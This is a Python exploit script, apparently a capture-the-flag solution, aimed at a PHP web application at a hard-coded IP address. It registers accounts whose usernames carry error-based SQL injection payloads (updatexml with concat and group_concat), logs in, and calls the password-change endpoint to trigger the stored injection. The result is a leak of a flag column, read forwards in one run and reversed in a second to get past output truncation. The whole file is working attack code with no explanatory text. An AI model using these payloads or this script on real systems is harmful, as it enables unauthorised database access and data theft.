import requests
import random

url = 'http://14.225.192.23:8042'

user = {}
# proxy = {
#     'proxy': 'http://localhost:8080'
# }
proxy = None

def do_register(payload):
    global user
    endpoint = '/register.php'
    username = f"ngn{payload}{random.randint(1000,9999)}"
    password = "ngn"
    email = random.randint(1000,9999)
    data = {
        'username': username,
        'password': password,
        'email': email
    }
    user = data
    return requests.post(url=url+endpoint, data=data, allow_redirects=False, proxies=proxy).status_code


def do_login():
    global user
    endpoint = '/login.php'
    data = {
        'username': user['username'],
        'password': user['password'],
    }
    return requests.post(url=url+endpoint, data=data, allow_redirects=False, proxies=proxy).headers['Set-Cookie']

def do_change_passwd(session):
    global user
    endpoint = '/changepwd.php'

    session = session.split(';')[0].strip()

    headers = {
        'Cookie': session
    }
    
    data = {
        'oldpass': user['password'],
        'newpass': user['password']
    }
    return requests.post(url=url+endpoint, data=data, headers=headers, allow_redirects=False, proxies=proxy).content

# reg = do_register("\"or(updatexml(0,concat(0x5e,(select(group_concat(real_flag_1s_here))from(users))),0))#") 

''' part 1'''
reg = do_register("\"or(updatexml(0,concat(0x5e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^flag'))),0))#") 
print(reg)
session = do_login()
change_passwd = do_change_passwd(session=session)
print(change_passwd)

''' part 2'''
reg = do_register("\"or(updatexml(0,concat(0x5e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^flag')))),0))#") 
print(reg)
session = do_login()
change_passwd = do_change_passwd(session=session)
print(change_passwd)